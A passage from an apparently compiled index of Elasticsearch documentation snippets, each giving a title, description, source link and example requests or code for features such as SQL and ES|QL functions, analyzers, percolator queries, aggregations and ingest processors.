3.281`)\n```\n\n----------------------------------------\n\nTITLE: Registering Elasticsearch Snapshot Repository in JSON\nDESCRIPTION: Creates a snapshot repository for Elasticsearch using the filesystem type, specifying the location and enabling compression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nPUT /_snapshot/repository\n{\n  \"type\": \"fs\",\n  \"settings\": {\n    \"location\": \"/usr/share/elasticsearch/snapshots\",\n    \"compress\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Enrollment Token for Kibana with Custom URL\nDESCRIPTION: Example command to create an enrollment token for enrolling a Kibana instance into a cluster, specifying a custom URL for the Elasticsearch node.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/create-enrollment-token.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-create-enrollment-token -s kibana --url \"https://172.0.0.3:9200\"\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Shape with Inline Definition\nDESCRIPTION: This snippet shows how to query Elasticsearch for documents whose `geometry` field is within a specified `envelope`. It uses an inline shape definition with the `shape` parameter.  The `relation` parameter specifies the spatial relationship to check.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-shape-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /example/_search\n{\n  \"query\": {\n    \"shape\": {\n      \"geometry\": {\n        \"shape\": {\n          \"type\": \"envelope\",\n          \"coordinates\": [ [ 1355.0, 5355.0 ], [ 1400.0, 5200.0 ] ]\n        },\n        \"relation\": \"within\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Mapping with Join Field Relation for Parent Aggregation\nDESCRIPTION: Creates an index with a join field mapping that establishes a question-answer relationship where question is the parent and answer is the child document type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-parent-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT parent_example\n{\n  \"mappings\": {\n     \"properties\": {\n       \"join\": {\n         \"type\": \"join\",\n         \"relations\": {\n           \"question\": \"answer\"\n         }\n       }\n     }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Formatting Dates with FORMAT in SQL\nDESCRIPTION: Returns the date/datetime/time as a string using the specified format pattern. The input can be a date, datetime, or time expression. If the function's parameters are null or invalid, it will return null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_50\n\nLANGUAGE: sql\nCODE:\n```\n\"FORMAT(\\n    date_exp/datetime_exp/time_exp, <1>\\n    string_exp) <2>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT FORMAT(CAST('2020-04-05' AS DATE), 'dd/MM/yyyy') AS \\\"date\\\";\\n\\n      date\\n------------------\\n05/04/2020\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT FORMAT(CAST('2020-04-05T11:22:33.987654' AS DATETIME), 'dd/MM/yyyy HH:mm:ss.ff') AS \\\"datetime\\\";\\n\\n      datetime\\n------------------\\n05/04/2020 11:22:33.98\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT FORMAT(CAST('11:22:33.987' AS TIME), 'HH mm ss.f') AS \\\"time\\\";\\n\\n      time\\n------------------\\n11 22 33.9\\n\"\n```\n\n----------------------------------------\n\nTITLE: Basic String Stats Aggregation Query in Elasticsearch\nDESCRIPTION: Demonstrates how to compute basic string statistics (count, length metrics, entropy) on a keyword field using the string_stats aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-string-stats-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"message_stats\": { \"string_stats\": { \"field\": \"message.keyword\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring the JSON Processor with Target Field in Elasticsearch\nDESCRIPTION: Example configuration of a JSON processor with a separate target field. This processor will parse the JSON content from 'string_source' field and store the result in 'json_target' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/json-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"json\" : {\n    \"field\" : \"string_source\",\n    \"target_field\" : \"json_target\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Source1 Access Control Document in Elasticsearch\nDESCRIPTION: Example of an Elasticsearch GET request to retrieve the access control document for a user from the source1 index, showing the structure of user identity and access control query templates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-e2e-guide.md#2025-04-21_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nGET .search-acl-filter-source1\n{\n  \"_id\": \"example.user@example.com\",\n  \"identity\": {\n      \"username\": \"example username\",\n      \"email\": \"example.user@example.com\"\n   },\n   \"query\": {\n        \"template\": {\n            \"params\": {\n                \"access_control\": [\n                    \"example.user@example.com\",\n                    \"source1-user-group\"]\n            }\n        },\n        \"source\": \"...\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Subtracting Minutes from DateTime\nDESCRIPTION: Shows how to subtract minutes from a ZonedDateTime object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_12\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime updatedZdt = zdt.minusMinutes(125);\n```\n\n----------------------------------------\n\nTITLE: Bulk Indexing Sample Documents for FVH Highlighting\nDESCRIPTION: Indexes the same test documents into 'index2' for testing the Fast Vector Highlighter functionality with the term vector configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_14\n\nLANGUAGE: json\nCODE:\n```\nPUT index2/_bulk?refresh=true\n{\"index\": {\"_id\": \"doc1\" }}\n{\"comment\": \"run with scissors\"}\n{ \"index\" : {\"_id\": \"doc2\"} }\n{\"comment\": \"running with scissors\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing Irish Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in Irish analyzer with specialized hyphenation handling, elision filter, Irish-specific lowercase filter, Irish stopwords, keyword marker for exclusions from stemming, and Irish stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nPUT /irish_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"irish_hyphenation\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  [ \"h\", \"n\", \"t\" ],\n          \"ignore_case\": true\n        },\n        \"irish_elision\": {\n          \"type\":       \"elision\",\n          \"articles\":   [ \"d\", \"m\", \"b\" ],\n          \"articles_case\": true\n        },\n        \"irish_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_irish_\" <1>\n        },\n        \"irish_lowercase\": {\n          \"type\":       \"lowercase\",\n          \"language\":   \"irish\"\n        },\n        \"irish_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"sampla\"] <2>\n        },\n        \"irish_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"irish\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_irish\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"irish_hyphenation\",\n            \"irish_elision\",\n            \"irish_lowercase\",\n            \"irish_stop\",\n            \"irish_keywords\",\n            \"irish_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Sum of Array Values Using MV_SUM in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_SUM function to calculate the sum of all values in an array field. The function takes an array as input and returns a single integer representing the sum of all elements in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 6]\n| EVAL sum_a = MV_SUM(a)\n```\n\n----------------------------------------\n\nTITLE: Mixed Sort Types Example in Elasticsearch\nDESCRIPTION: Demonstrates how top_metrics handles sorting when dealing with fields that have different types across indices. Shows the default behavior where floating point fields are sorted independently of whole numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPOST /test/_bulk?refresh\n{\"index\": {\"_index\": \"test1\"}}\n{\"s\": 1, \"m\": 3.1415}\n{\"index\": {\"_index\": \"test1\"}}\n{\"s\": 2, \"m\": 1}\n{\"index\": {\"_index\": \"test2\"}}\n{\"s\": 3.1, \"m\": 2.71828}\nPOST /test*/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"tm\": {\n      \"top_metrics\": {\n        \"metrics\": {\"field\": \"m\"},\n        \"sort\": {\"s\": \"asc\"}\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"aggregations\": {\n    \"tm\": {\n      \"top\": [ {\"sort\": [3.0999999046325684], \"metrics\": {\"m\": 2.718280076980591 } } ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Fetching All SET Type Records\nDESCRIPTION: JSON configuration for advanced sync rules to fetch all Redis database records where type is 'SET'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"key_pattern\": \"*\",\n    \"type\": \"SET\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Def Type XOR Using '^': Painless Example\nDESCRIPTION: Illustrates using the XOR operator on 'def' types in Painless. The function implements XOR logic on dynamically typed booleans, converting 'def' types if necessary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_30\n\nLANGUAGE: Painless\nCODE:\n```\ndef x = false;\ndef y = x ^ true;\ny = y ^ x;\n```\n\n----------------------------------------\n\nTITLE: Connector Configuration (Dockerized)\nDESCRIPTION: This YAML configuration snippet demonstrates how to configure the self-managed connector to use the data extraction service within a Docker environment.  The `host` points to the internal Docker endpoint, `host.docker.internal`, and the `shared_volume_dir` is configured for `/app/files`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\n# data-extraction-service settings\nextraction_service:\n  host: http://host.docker.internal:8090\n  use_file_pointers: true\n  shared_volume_dir: '/app/files'\n```\n\n----------------------------------------\n\nTITLE: Complex GROUP BY with Multiple ORDER BY\nDESCRIPTION: Illustrates grouping by multiple columns with complex ordering criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_26\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender g, languages l, COUNT(*) c FROM \"emp\" GROUP BY g, l ORDER BY languages ASC, gender DESC;\n```\n\n----------------------------------------\n\nTITLE: Executing geohash_grid aggregation in Elasticsearch\nDESCRIPTION: This snippet showcases performing a geohash_grid aggregation query in Elasticsearch to group documents by geohash values. It uses the GET HTTP method and specifies the location field with precision for aggregation. Outputs the document count per bucket in the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_1\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nGET /my_locations/_search\n{\n  \"size\" : 0,\n  \"aggs\" : {\n     \"grouped\" : {\n        \"geohash_grid\" : {\n           \"field\" : \"location\",\n           \"precision\" : 2\n        }\n     }\n  }\n}\n```\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\n  \"took\" : 10,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 3,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : null,\n    \"hits\" : [ ]\n  },\n  \"aggregations\" : {\n    \"grouped\" : {\n      \"buckets\" : [\n        {\n          \"key\" : \"u1\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : \"u0\",\n          \"doc_count\" : 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using ENDS_WITH Function in ESQL Query\nDESCRIPTION: This snippet demonstrates how to use the ENDS_WITH function in an ESQL query. It filters the 'employees' table, keeps only the 'last_name' column, and then evaluates whether each last name ends with the letter 'd'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/ends_with.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_E = ENDS_WITH(last_name, \"d\")\n```\n\n----------------------------------------\n\nTITLE: Comparing Date Fields with Date Math in Elasticsearch SQL\nDESCRIPTION: Example showing how to query records where hire_date equals a specific date with date math expression. This demonstrates the use of the equality operator with date math expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT hire_date FROM emp WHERE hire_date = '1987-03-01||+4y/y';\n\n       hire_date\n------------------------\n1991-01-26T00:00:00.000Z\n1991-10-22T00:00:00.000Z\n1991-09-01T00:00:00.000Z\n1991-06-26T00:00:00.000Z\n1991-08-30T00:00:00.000Z\n1991-12-01T00:00:00.000Z\n```\n\n----------------------------------------\n\nTITLE: Sorting Multi-Value Arrays with mv_sort in ESQL\nDESCRIPTION: This example demonstrates using the mv_sort function to sort a multi-value array in both ascending (default) and descending order. The function takes an array as input and returns a sorted copy, with an optional second parameter to specify sort direction.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_sort.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [4, 2, -3, 2]\n| EVAL sa = mv_sort(a), sd = mv_sort(a, \"DESC\")\n```\n\n----------------------------------------\n\nTITLE: Changing Default Similarity During Index Creation in Elasticsearch\nDESCRIPTION: An example of changing the default similarity model for all fields in an Elasticsearch index during its creation. This uses the boolean similarity model instead of the default BM25.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"index\": {\n      \"similarity\": {\n        \"default\": {\n          \"type\": \"boolean\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Result of Analyze API with word_delimiter\nDESCRIPTION: This shows the expected output from the Analyze API when using the `word_delimiter` filter with the provided input text and default settings.  The output is a list of tokens after being processed by the tokenizer and filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n[ Neil, Super, Duper, XL, 500, 42, Auto, Coder ]\n```\n\n----------------------------------------\n\nTITLE: Percolating an Existing Document Using Index Response\nDESCRIPTION: Uses index response information like '_id' and '_version' to percolate an existing document. It affirms matching logic by specifying an exact version to avoid conflicts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"index\": \"my-index-000001\",\n      \"id\": \"2\",\n      \"version\": 1\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting String to Timestamp and Extracting Year\nDESCRIPTION: Example showing how to use CAST to convert a string to a TIMESTAMP type and then extract the year using the YEAR function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT YEAR(CAST('2018-05-19T11:23:45Z' AS TIMESTAMP)) AS year;\n\n     year\n---------------\n2018\n```\n\n----------------------------------------\n\nTITLE: COALESCE Function\nDESCRIPTION: Returns the first non-null value from a list of expressions. Takes multiple arguments and is useful for handling null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCOALESCE(\n    expression,\n    expression,\n    ...)\n```\n\n----------------------------------------\n\nTITLE: Generating Disjunction of Multi-Field Functions Query in Elasticsearch\nDESCRIPTION: This snippet shows how to create a disjunction query using multiple field functions in Elasticsearch. It combines string concatenation and numeric addition operations with an OR condition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_22\n\nLANGUAGE: eql\nCODE:\n```\nprocess where concat(file_name, \".\", process_name) == \"foo\" or add(pid, ppid) > 100\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"should\":[{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalEqlScriptUtils.multiValueDocValues(doc,params.v1,X1->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalEqlScriptUtils.concat([X0,params.v2,X1]),params.v3))))\",\"params\":{\"v0\":\"file_name.keyword\",\"v1\":\"process_name\",\"v2\":\".\",\"v3\":\"foo\"}}}},{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalEqlScriptUtils.multiValueDocValues(doc,params.v1,X1->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalQlScriptUtils.add(X0,X1),params.v2))))\",\"params\":{\"v0\":\"pid\",\"v1\":\"ppid\",\"v2\":100}}}}]}\n```\n\n----------------------------------------\n\nTITLE: Multi-document Percolator Query\nDESCRIPTION: Example of percolating multiple documents simultaneously with highlighting enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"documents\": [\n        {\n          \"message\": \"bonsai tree\"\n        },\n        {\n          \"message\": \"new tree\"\n        },\n        {\n          \"message\": \"the office\"\n        },\n        {\n          \"message\": \"office tree\"\n        }\n      ]\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"message\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing DocValues Fields for Elasticsearch in Java\nDESCRIPTION: This segment implements various DocValues fields for Elasticsearch scripts, defining methods to retrieve field data typically stored in document values. These include primitive data types like integer, long, float, and specialized types such as GeoPoint and IPAddress.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.fields.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.BinaryDocValuesField @dynamic_type {\n  ByteBuffer get(ByteBuffer)\n  ByteBuffer get(int, ByteBuffer)\n}\n\nclass org.elasticsearch.script.field.BooleanDocValuesField @dynamic_type {\n  boolean get(boolean)\n  boolean get(int, boolean)\n}\n\nclass org.elasticsearch.script.field.IntegerDocValuesField @dynamic_type {\n  int get(int)\n  int get(int, int)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Mandatory Plugins in Elasticsearch YAML Configuration\nDESCRIPTION: This YAML configuration snippet demonstrates how to specify mandatory plugins in the Elasticsearch config/elasticsearch.yml file. It ensures that the node will not start if the specified plugins are missing, enhancing system reliability.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mandatory-plugins.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nplugin.mandatory: analysis-icu,lang-js\n```\n\n----------------------------------------\n\nTITLE: ENRICH Command with Column Renaming in Elasticsearch SQL\nDESCRIPTION: Shows how to rename the columns that are added during enrichment using the WITH clause with custom naming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-enrich-data.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1\"\n| ENRICH languages_policy ON a WITH name = language_name\n```\n\n----------------------------------------\n\nTITLE: Using MV_MIN Function with Integer Arrays in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_MIN function to find the minimum value in an integer array. The function receives a multi-valued field as input and returns the smallest value from the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_min.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[2, 1]\n| EVAL min_a = MV_MIN(a)\n```\n\n----------------------------------------\n\nTITLE: Using MIN Function in Elasticsearch SQL\nDESCRIPTION: The MIN function returns the minimum value across input values in a specified numeric field, ignoring null values. For text or keyword fields, it behaves like the FIRST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nMIN(field_name) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min FROM emp;\n\n      min\n---------------\n25324\n```\n\n----------------------------------------\n\nTITLE: Clearing a Single Scroll Context in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to clear a single scroll context using the clear-scroll API. It's important to clear scroll contexts when they are no longer needed to free up resources.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nDELETE /_search/scroll\n{\n  \"scroll_id\" : \"DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAAD4WYm9laVYtZndUQlNsdDcwakFMNjU1QQ==\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using SHOW CATALOGS Command in Elasticsearch SQL\nDESCRIPTION: The SHOW CATALOGS command lists all available catalogs in Elasticsearch along with their types. The result displays the name and type columns, indicating whether each catalog is local or remote.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-catalogs.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSHOW CATALOGS\n```\n\nLANGUAGE: sql\nCODE:\n```\nSHOW CATALOGS;\n\n     name         |     type\n------------------+---------------\njavaRestTest         |local\nmy_remote_cluster |remote\n```\n\n----------------------------------------\n\nTITLE: Script Score Query Example\nDESCRIPTION: This snippet shows an example of a script_score query that calculates the score of each document by dividing the value of the 'my-int' field by 10. It demonstrates the basic structure of the query, including the 'query' and 'script' parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\": {\n        \"match\": { \"message\": \"elasticsearch\" }\n      },\n      \"script\": {\n        \"source\": \"doc['my-int'].value / 10 \"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Boolean Filter Query with Match All in Elasticsearch\nDESCRIPTION: This example combines a `match_all` query within the `must` clause and a `term` filter in the `filter` clause. This means all documents are matched by `match_all` and then filtered to only include documents where `status` is `active`. The score for all matched documents will be `1.0` due to the `match_all` query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"term\": {\n          \"status\": \"active\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring KV Processor in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the KV processor to parse a log message containing key-value pairs. It specifies the field to be parsed, the delimiter for splitting key-value pairs, and the delimiter for splitting keys from values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/kv-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"kv\": {\n    \"field\": \"message\",\n    \"field_split\": \" \",\n    \"value_split\": \"=\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multiple Pattern Redaction with Custom Tokens\nDESCRIPTION: Example demonstrating how to redact multiple patterns (IP and email) with custom prefix and suffix tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/redact-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"description\": \"Hide my IP\",\n    \"processors\": [\n      {\n        \"redact\": {\n          \"field\": \"message\",\n          \"patterns\": [\n            \"%{IP:REDACTED}\",\n            \"%{EMAILADDRESS:REDACTED}\"\n          ],\n          \"prefix\": \"*\",\n          \"suffix\": \"*\"\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"message\": \"55.3.244.1 GET /index.html 15824 0.043 test@elastic.co\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Index Version Information in Elasticsearch\nDESCRIPTION: This snippet shows the response from checking the index version, confirming the upgrade to version 8.x.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n  \".migrated-ds-my-data-stream-2025.01.23-000001\": {\n    \"settings\": {\n      \"index\": {\n        \"version\": {\n          \"created_string\": \"8.18.0\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon Shape in GeoJSON Format\nDESCRIPTION: This example shows how to index a polygon shape in GeoJSON format. The polygon is defined with a type and coordinates array containing a list of points, where the first and last points must be the same to close the polygon.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"polygon\",\n    \"coordinates\" : [\n      [ [1000.0, -1001.0], [1001.0, -1001.0], [1001.0, -1000.0], [1000.0, -1000.0], [1000.0, -1001.0] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Forward and Reversed Path Hierarchy Tokenizers for File Path Analysis\nDESCRIPTION: This example sets up an index with two custom path hierarchy analyzers (forward and reversed) and applies them to multifields of a file_path field, then indexes sample documents with file paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT file-path-test\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"custom_path_tree\": {\n          \"tokenizer\": \"custom_hierarchy\"\n        },\n        \"custom_path_tree_reversed\": {\n          \"tokenizer\": \"custom_hierarchy_reversed\"\n        }\n      },\n      \"tokenizer\": {\n        \"custom_hierarchy\": {\n          \"type\": \"path_hierarchy\",\n          \"delimiter\": \"/\"\n        },\n        \"custom_hierarchy_reversed\": {\n          \"type\": \"path_hierarchy\",\n          \"delimiter\": \"/\",\n          \"reverse\": \"true\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"file_path\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"tree\": {\n            \"type\": \"text\",\n            \"analyzer\": \"custom_path_tree\"\n          },\n          \"tree_reversed\": {\n            \"type\": \"text\",\n            \"analyzer\": \"custom_path_tree_reversed\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPOST file-path-test/_doc/1\n{\n  \"file_path\": \"/User/alice/photos/2017/05/16/my_photo1.jpg\"\n}\n\nPOST file-path-test/_doc/2\n{\n  \"file_path\": \"/User/alice/photos/2017/05/16/my_photo2.jpg\"\n}\n\nPOST file-path-test/_doc/3\n{\n  \"file_path\": \"/User/alice/photos/2017/05/16/my_photo3.jpg\"\n}\n\nPOST file-path-test/_doc/4\n{\n  \"file_path\": \"/User/alice/photos/2017/05/15/my_photo1.jpg\"\n}\n\nPOST file-path-test/_doc/5\n{\n  \"file_path\": \"/User/bob/photos/2017/05/16/my_photo1.jpg\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL FROM Query with Date Math\nDESCRIPTION: Shows how to use date math in an ESQL FROM command to query today's log index.\nSOURCE: 